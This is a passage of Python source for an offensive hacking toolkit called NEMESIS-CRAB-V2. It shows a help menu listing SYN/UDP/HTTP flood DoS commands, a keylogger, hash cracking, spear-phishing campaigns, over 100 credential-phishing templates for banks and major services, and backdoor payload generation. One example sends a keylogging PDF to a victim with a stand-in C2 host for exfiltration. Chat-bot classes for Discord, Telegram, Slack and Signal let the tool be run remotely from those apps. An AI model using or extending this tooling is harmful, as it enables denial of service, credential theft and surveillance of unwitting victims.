║  wget_no_clobber <url>         - No clobber
║  wget_delete_after <url>       - Delete after
║  wget_progress <url>           - Progress bar
║  wget_show_progress <url>      - Show progress
║  wget_config <file>            - Config file
║  wget_append_output <url> <f>  - Append output
║  wget_output_file <url> <f>    - Output file
║  wget_no_parent <url>          - No parent
║  wget_cut_dirs <url> <n>       - Cut dirs
║  wget_directory_prefix <u> <d> - Directory prefix
║  wget_convert_links <url>      - Convert links
║  wget_backup_converted <url>   - Backup converted
║  wget_adjust_extension <url>   - Adjust extension
║  wget_restrict_file_names <u>  - Restrict names
║  wget_trust_server_names <url> - Trust server names
║  wget_content_disposition <u>  - Content disposition
║  wget_random_wait <url>        - Random wait
║  wget_wait <url> <sec>         - Wait between downloads
║  wget_waitretry <url> <sec>    - Wait between retries
║  wget_quota <url> <quota>      - Quota
║  wget_dns_timeout <url> <sec>  - DNS timeout
║  wget_connect_timeout <url> <s>- Connect timeout
║  wget_read_timeout <url> <sec> - Read timeout
║  wget_retry_connrefused <url>  - Retry refused
║  wget_inet4_only <url>         - IPv4 only
║  wget_inet6_only <url>         - IPv6 only
║  wget_prefer_family <url> <f>  - Prefer family
║  wget_bind_address <url> <ip>  - Bind address
║  wget_no_dns_cache <url>       - No DNS cache
║  wget_no_http_keep_alive <url> - No keep-alive
║  wget_no_cache <url>           - No cache
║  wget_no_cookies <url>         - No cookies
║  wget_load_cookies <url> <f>   - Load cookies
║  wget_keep_session_cookies <u> - Keep session cookies
║  wget_warc_file <url> <prefix> - WARC file
║  wget_warc_header <url> <hdr>  - WARC header
║  wget_warc_max_size <url> <sz> - WARC max size
║  wget_warc_cdx <url>           - WARC CDX
║  wget_warc_dedup <url> <file>  - WARC dedup
║  wget_no_warc_compression <u>  - No WARC compression
║  wget_no_warc_digests <url>    - No WARC digests
║  wget_no_warc_keep_log <url>   - No WARC keep log
║  wget_warc_tempdir <url> <dir> - WARC temp dir
║  wget_help                     - Wget help
║  wget_version                  - Wget version
║
║{Colors.BLUE}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_patch <url> <data>       - PATCH request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  curl_output <url> <file>      - Output to file
║  curl_remote_name <url>        - Remote name
║  curl_location <url>           - Follow redirects
║  curl_include <url>            - Include headers
║  curl_verbose <url>            - Verbose
║  curl_silent <url>             - Silent
║  curl_show_error <url>         - Show error
║  curl_fail <url>               - Fail on error
║  curl_insecure <url>           - Insecure
║  curl_data <url> <data>        - POST data
║  curl_data_binary <url> <file> - Binary data
║  curl_data_urlencode <url> <d> - URL encode data
║  curl_data_raw <url> <data>    - Raw data
║  curl_form <url> <name> <val>  - Form data
║  curl_header <url> <header>    - Custom header
║  curl_user_agent <url> <ua>    - User agent
║  curl_referer <url> <ref>      - Referer
║  curl_user <url> <user:pass>   - Basic auth
║  curl_basic <url> <user:pass>  - Basic auth
║  curl_digest <url> <user:pass> - Digest auth
║  curl_ntlm <url> <user:pass>   - NTLM auth
║  curl_negotiate <url> <u:p>    - Negotiate auth
║  curl_cookie <url> <cookie>    - Cookie
║  curl_cookie_jar <url> <file>  - Cookie jar
║  curl_proxy <url> <proxy>      - Proxy
║  curl_proxy_user <url> <p> <u>- Proxy user
║  curl_noproxy <url> <hosts>    - No proxy
║  curl_cert <url> <cert>        - Client cert
║  curl_key <url> <key>          - Private key
║  curl_cacert <url> <ca>        - CA cert
║  curl_capath <url> <path>      - CA path
║  curl_ciphers <url> <ciphers>  - Ciphers
║  curl_tlsv1_2 <url>            - TLS 1.2
║  curl_tlsv1_3 <url>            - TLS 1.3
║  curl_continue_at <url>        - Continue download
║  curl_range <url> <range>      - Range request
║  curl_limit_rate <url> <rate>  - Limit rate
║  curl_max_filesize <url> <sz>  - Max filesize
║  curl_max_time <url> <sec>     - Max time
║  curl_connect_timeout <url> <s>- Connect timeout
║  curl_retry <url> <count>      - Retry count
║  curl_retry_delay <url> <sec>  - Retry delay
║  curl_retry_max_time <url> <s> - Retry max time
║  curl_retry_connrefused <url>  - Retry refused
║  curl_keepalive_time <url> <s> - Keepalive time
║  curl_no_keepalive <url>       - No keepalive
║  curl_tcp_nodelay <url>        - TCP nodelay
║  curl_ipv4 <url>               - IPv4 only
║  curl_ipv6 <url>               - IPv6 only
║  curl_interface <url> <if>     - Interface
║  curl_local_port <url> <port>  - Local port
║  curl_dns_servers <url> <serv> - DNS servers
║  curl_resolve <url> <host:port:addr> - Resolve
║  curl_connect_to <url> <h:p:a> - Connect to
║  curl_unix_socket <url> <sock> - Unix socket
║  curl_http1_0 <url>            - HTTP 1.0
║  curl_http1_1 <url>            - HTTP 1.1
║  curl_http2 <url>              - HTTP 2
║  curl_http3 <url>              - HTTP 3
║  curl_compressed <url>         - Compressed
║  curl_raw <url>                - Raw
║  curl_ignore_content_length <u>- Ignore content length
║  curl_no_buffer <url>          - No buffer
║  curl_write_out <url> <format> - Write out
║  curl_dump_header <url> <file> - Dump headers
║  curl_trace <url> <file>       - Trace
║  curl_trace_ascii <url> <file> - Trace ASCII
║  curl_manual                   - Manual
║  curl_help                     - Help
║  curl_version                  - Version
║  curl_parallel <url1> <url2>   - Parallel
║  curl_config <file>            - Config file
║  curl_next <url1> <url2>       - Next URL
║  curl_styled_output <url>      - Styled output
║  curl_no_styled_output <url>   - No styled output
║  curl_progress_bar <url>       - Progress bar
║  curl_no_progress_meter <url>  - No progress meter
║  curl_url_query <url> <query>  - URL query
║  curl_json <url> <json>        - JSON
║  curl_variable <url> <name=v>  - Variable
║  curl_expand_url <url> <url>   - Expand URL
║  curl_aws_sigv4 <url> <p> <u>  - AWS SigV4
║  curl_netrc <url>              - Netrc
║  curl_netrc_file <url> <file>  - Netrc file
║  curl_netrc_optional <url>     - Netrc optional
║  curl_ssl <url>                - SSL
║  curl_ssl_reqd <url>           - SSL required
║  curl_ftp_port <url>           - FTP port
║  curl_ftp_pasv <url>           - FTP passive
║  curl_ftp_ssl <url>            - FTP SSL
║  curl_ftp_ssl_ccc <url>        - FTP SSL CCC
║  curl_ftp_create_dirs <u> <f>  - FTP create dirs
║  curl_ftp_method <url> <m>     - FTP method
║  curl_ftp_pret <url>           - FTP PRET
║  curl_ftp_skip_pasv_ip <url>   - FTP skip PASV IP
║  curl_disable_eprt <url>       - Disable EPRT
║  curl_disable_epsv <url>       - Disable EPSV
║  curl_tftp_blksize <url> <sz>  - TFTP block size
║  curl_tftp_no_options <url>    - TFTP no options
║  curl_upload_file <url> <file> - Upload file
║  curl_mail_from <url> <email>  - Mail from
║  curl_mail_rcpt <url> <email>  - Mail recipient
║  curl_mail_auth <url> <email>  - Mail auth
║  curl_sasl_ir <url>            - SASL IR
║  curl_login_options <url> <o>  - Login options
║  curl_url <url>                - URL
║  curl_disable                  - Disable
║  curl_no_sessionid <url>       - No session ID
║  curl_no_http_keepalive <url>  - No HTTP keepalive
║  curl_buffered <url>           - Buffered
║  curl_happy_eyeballs_timeout <u> - Happy eyeballs timeout
║  curl_expect100_timeout <u> <s>- Expect100 timeout
║  curl_speed_limit <url> <b>    - Speed limit
║  curl_speed_time <url> <sec>   - Speed time
║  curl_stderr <url> <file>      - Stderr
║  curl_no_stderr <url>          - No stderr
║  curl_tcp_keepalive <url>      - TCP keepalive
║  curl_crlf <url>               - CRLF
║  curl_skip_existing <url>      - Skip existing
║  curl_xattr <url>              - Xattr
║  curl_no_xattr <url>           - No xattr
║  curl_use_ascii <url>          - Use ASCII
║  curl_disallow_username_in_url <u> - Disallow username
║  curl_globoff <url>            - Globoff
║  curl_haproxy_clientip <url> <ip> - HAProxy client IP
║  curl_proxy_cacert <url> <ca>  - Proxy CA cert
║  curl_proxy_capath <url> <p>   - Proxy CA path
║  curl_proxy_cert <url> <cert>  - Proxy cert
║  curl_proxy_cert_type <url> <t>- Proxy cert type
║  curl_proxy_ciphers <url> <c>  - Proxy ciphers
║  curl_proxy_crlfile <url> <f>  - Proxy CRL file
║  curl_proxy_header <url> <h>   - Proxy header
║  curl_proxy_key <url> <key>    - Proxy key
║  curl_proxy_key_type <url> <t> - Proxy key type
║  curl_proxy_pass <url> <pass>  - Proxy pass
║  curl_proxy_service_name <u><n>- Proxy service name
║  curl_proxy_tls13_ciphers <u><c>- Proxy TLS13 ciphers
║  curl_proxy_tlsauthtype <u><t> - Proxy TLS auth type
║  curl_proxy_tlspassword <u><p> - Proxy TLS password
║  curl_proxy_tlsuser <u> <user>- Proxy TLS user
║  curl_proxy_tlsv1 <url>        - Proxy TLSv1
║  curl_proxy1_0 <url> <proxy>   - Proxy 1.0
║  curl_socks4 <url> <proxy>     - SOCKS4
║  curl_socks4a <url> <proxy>    - SOCKS4a
║  curl_socks5 <url> <proxy>     - SOCKS5
║  curl_socks5_hostname <u> <p>  - SOCKS5 hostname
║  curl_socks5_basic <url> <p>   - SOCKS5 basic
║  curl_socks5_gssapi <url> <p>  - SOCKS5 GSSAPI
║  curl_socks5_gssapi_nec <u> <p>- SOCKS5 GSSAPI NEC
║  curl_socks5_gssapi_service <u><n> - SOCKS5 service
║  curl_preproxy <url> <proxy>   - Preproxy
║  curl_abstract_unix_socket <u><s> - Abstract unix socket
║  curl_tls13_ciphers <url> <c>  - TLS13 ciphers
║  curl_tlsauthtype <url> <type> - TLS auth type
║  curl_tlspassword <url> <pass> - TLS password
║  curl_tlsuser <url> <user>     - TLS user
║  curl_crlfile <url> <file>     - CRL file
║  curl_cert_status <url>        - Cert status
║  curl_false_start <url>        - False start
║  curl_no_alpn <url>            - No ALPN
║  curl_no_npn <url>             - No NPN
║  curl_compressed_ssh <url>     - Compressed SSH
║  curl_ssl_allow_beast <url>    - SSL allow BEAST
║  curl_no_ssl_session_reuse <u> - No SSL session reuse
║
║{Colors.BLUE}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan
║  nmap_os <target>              - OS detection
║  nmap_service <target>         - Service detection
║  nmap_udp <target>             - UDP scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth scan
║  nmap_ping <target>            - Ping scan
║  nmap_ports <target> <ports>   - Port range
║  nmap_script <target> <script> - NSE script
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_traceroute <target>      - Traceroute
║  nmap_output <target> <file>   - Output file
║  nmap_exclude <target> <ex>    - Exclude hosts
║  nmap_exclude_file <target> <f>- Exclude file
║  nmap_input <file>             - Input file
║  nmap_random <count>           - Random targets
║  nmap_timing <target> <level>  - Timing template
║  nmap_version                  - Version
║  nmap_help                     - Help
║
║{Colors.BLUE}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.BLUE}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.BLUE}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║
║{Colors.BLUE}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood
║  dos_udp <ip> <port> <duration> [threads] - UDP flood
║  dos_http <ip> <port> <duration> [threads] - HTTP flood
║  dos_icmp <ip> <duration> [threads] - ICMP flood
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.BLUE}🎣 SPEAR PHISHING:{Colors.RESET}
║  spear_create <name> <subject> <from> <template> <targets> - Create campaign
║  spear_send <campaign_id>      - Send campaign
║  spear_list                    - List all campaigns
║
║{Colors.BLUE}⌨️ KEYLOGGER COMMANDS:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.BLUE}🔓 CRACKING COMMANDS:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Start cracking
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║  crack_md5 <hash>              - Crack MD5 hash
║  crack_sha1 <hash>             - Crack SHA1 hash
║  crack_sha256 <hash>           - Crack SHA256 hash
║  crack_sha512 <hash>           - Crack SHA512 hash
║  crack_ntlm <hash>             - Crack NTLM hash
║  crack_bcrypt <hash>           - Crack bcrypt hash
║  crack_all <hash>              - Try all hash types
║
║{Colors.BLUE}🐳 DOCKER COMMANDS:{Colors.RESET}
║  docker_scan <image>           - Scan Docker image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║  docker_bench                  - Docker Bench Security
║
║{Colors.BLUE}🔬 REVERSE ENGINEERING:{Colors.RESET}
║  re_strings <file> [min_len]   - Extract strings
║  re_hexdump <file> [offset] [len] - Hex dump
║  re_disassemble <file>         - Disassemble binary
║  re_decompile <file>           - Decompile binary
║  re_decode <data> <encoding>   - Decode obfuscated data
║  re_metadata <file>            - File metadata analysis
║  re_extract <file>             - Extract embedded files
║  re_analyze <file>             - Complete analysis
║  re_list                       - List RE jobs
║
║{Colors.BLUE}🎣 SOCIAL ENGINEERING (100+ Templates):{Colors.RESET}
║  phish_facebook                - Facebook phishing
║  phish_instagram               - Instagram phishing
║  phish_twitter                 - Twitter/X phishing
║  phish_linkedin                - LinkedIn phishing
║  phish_gmail                   - Gmail phishing
║  phish_microsoft               - Microsoft phishing
║  phish_google                  - Google phishing
║  phish_apple                   - Apple phishing
║  phish_paypal                  - PayPal phishing
║  phish_amazon                  - Amazon phishing
║  phish_netflix                 - Netflix phishing
║  phish_spotify                 - Spotify phishing
║  phish_whatsapp                - WhatsApp phishing
║  phish_telegram                - Telegram phishing
║  phish_discord                 - Discord phishing
║  phish_snapchat                - Snapchat phishing
║  phish_tiktok                  - TikTok phishing
║  phish_reddit                  - Reddit phishing
║  phish_github                  - GitHub phishing
║  phish_gitlab                  - GitLab phishing
║  phish_protonmail              - ProtonMail phishing
║  phish_yahoo                   - Yahoo phishing
║  phish_slack                   - Slack phishing
║  phish_zoom                    - Zoom phishing
║  phish_teams                   - Teams phishing
║  phish_steam                   - Steam phishing
║  phish_roblox                  - Roblox phishing
║  phish_twitch                  - Twitch phishing
║  phish_epicgames               - Epic Games phishing
║  phish_minecraft               - Minecraft phishing
║  phish_xbox                    - Xbox phishing
║  phish_playstation             - PlayStation phishing
║  phish_cashapp                 - Cash App phishing
║  phish_venmo                   - Venmo phishing
║  phish_chase                   - Chase phishing
║  phish_wellsfargo              - Wells Fargo phishing
║  phish_bankofamerica           - Bank of America phishing
║  phish_citibank                - Citibank phishing
║  phish_capitalone              - Capital One phishing
║  phish_americanexpress         - American Express phishing
║  phish_discover                - Discover phishing
║  phish_barclays                - Barclays phishing
║  phish_hsbc                    - HSBC phishing
║  phish_revolut                 - Revolut phishing
║  phish_monzo                   - Monzo phishing
║  phish_stripe                  - Stripe phishing
║  phish_square                  - Square phishing
║  phish_coinbase                - Coinbase phishing
║  phish_binance                 - Binance phishing
║  phish_kraken                  - Kraken phishing
║  phish_metamask                - MetaMask phishing
║  phish_tinder                  - Tinder phishing
║  phish_bumble                  - Bumble phishing
║  phish_hinge                   - Hinge phishing
║  phish_okcupid                 - OkCupid phishing
║  phish_match                   - Match.com phishing
║  phish_grindr                  - Grindr phishing
║  phish_hulu                    - Hulu phishing
║  phish_disneyplus              - Disney+ phishing
║  phish_hbomax                  - HBO Max phishing
║  phish_primevideo              - Prime Video phishing
║  phish_appletv                 - Apple TV+ phishing
║  phish_paramount               - Paramount+ phishing
║  phish_peacock                 - Peacock phishing
║  phish_crunchyroll             - Crunchyroll phishing
║  phish_ebay                    - eBay phishing
║  phish_walmart                 - Walmart phishing
║  phish_target                  - Target phishing
║  phish_bestbuy                 - Best Buy phishing
║  phish_etsy                    - Etsy phishing
║  phish_aliexpress              - AliExpress phishing
║  phish_alibaba                 - Alibaba phishing
║  phish_wish                    - Wish phishing
║  phish_shein                   - Shein phishing
║  phish_temu                    - Temu phishing
║  phish_aws                     - AWS phishing
║  phish_azure                   - Azure phishing
║  phish_gcp                     - Google Cloud phishing
║  phish_digitalocean            - DigitalOcean phishing
║  phish_cloudflare              - Cloudflare phishing
║  phish_namecheap               - Namecheap phishing
║  phish_godaddy                 - GoDaddy phishing
║  phish_heroku                  - Heroku phishing
║  phish_vercel                  - Vercel phishing
║  phish_netlify                 - Netlify phishing
║  phish_coursera                - Coursera phishing
║  phish_udemy                   - Udemy phishing
║  phish_edx                     - edX phishing
║  phish_khanacademy             - Khan Academy phishing
║  phish_duolingo                - Duolingo phishing
║  phish_irs                     - IRS phishing
║  phish_dmv                     - DMV phishing
║  phish_usps                    - USPS phishing
║  phish_fedex                   - FedEx phishing
║  phish_ups                     - UPS phishing
║  phish_nordvpn                 - NordVPN phishing
║  phish_expressvpn              - ExpressVPN phishing
║  phish_surfshark               - Surfshark phishing
║  phish_lastpass                - LastPass phishing
║  phish_1password               - 1Password phishing
║  phish_custom                  - Custom phishing
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║  phish_list                    - List all phishing links
║
║{Colors.BLUE}📦 PAYLOAD COMMANDS:{Colors.RESET}
║  payload_exe <name>            - Generate EXE payload
║  payload_pdf <name>            - Generate PDF payload
║  payload_docx <name>           - Generate DOCX payload
║  payload_link <name>           - Generate Link payload
║  payload_network <name> <ip> [port] [type] - Network payload
║  payload_list [type]           - List payloads
║  payload_deploy <id> <type> [target] - Deploy payload
║
║{Colors.BLUE}🌐 DOMAIN TRANSLATION:{Colors.RESET}
║  ip_to_domain <ip>             - Translate IP to domain
║  domain_to_ip <domain>         - Translate domain to IP
║  host_domain <ip> <domain> [port] - Host a domain
║  host_website <domain> <file>  - Host a website
║  list_domains                  - List hosted domains
║  domain_info <domain>          - Domain information
║
║{Colors.BLUE}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.BLUE}🛡️ NETWORK COMMANDS:{Colors.RESET}
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  location <ip>                 - IP geolocation
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║
║{Colors.BLUE}📊 REPORT COMMANDS:{Colors.RESET}
║  report_pdf <target>           - Generate PDF report
║  report_json <target>          - Generate JSON report
║  report_both <target>          - Generate both reports
║  report_list                   - List reports
║
║{Colors.BLUE}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.ORANGE}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  nmap_quick 192.168.1.1
║  curl https://example.com
║  wget https://example.com/file.zip
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  dos_syn 192.168.1.100 80 30 100
║  keylogger_start
║  crack_md5 5f4dcc3b5aa765d61d8327deb882cf99
║  docker_scan alpine:latest
║  re_strings suspicious.exe
║  re_analyze malware.bin
║  phish_facebook
║  payload_exe backdoor
║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
║  add_ip 192.168.1.100 Suspicious
║  analyze_ip 8.8.8.8
║
║{Colors.PURPLE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# BOT INTEGRATIONS
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🦀 NEMESIS-CRAB-V2 Response", description=f"```{output}```", color=0x6A0DAD)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return TELETHON_AVAILABLE and self.config.get('bot_token')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('nemesis_crab_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE or not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + os.path.join(CONFIG_DIR, "whatsapp_session"))
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")

class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config.get('phone_number', '')],
                    capture_output=True, text=True, timeout=30
                )
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config.get('phone_number', '')]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass

class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "googlechat_config.json")):
                with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
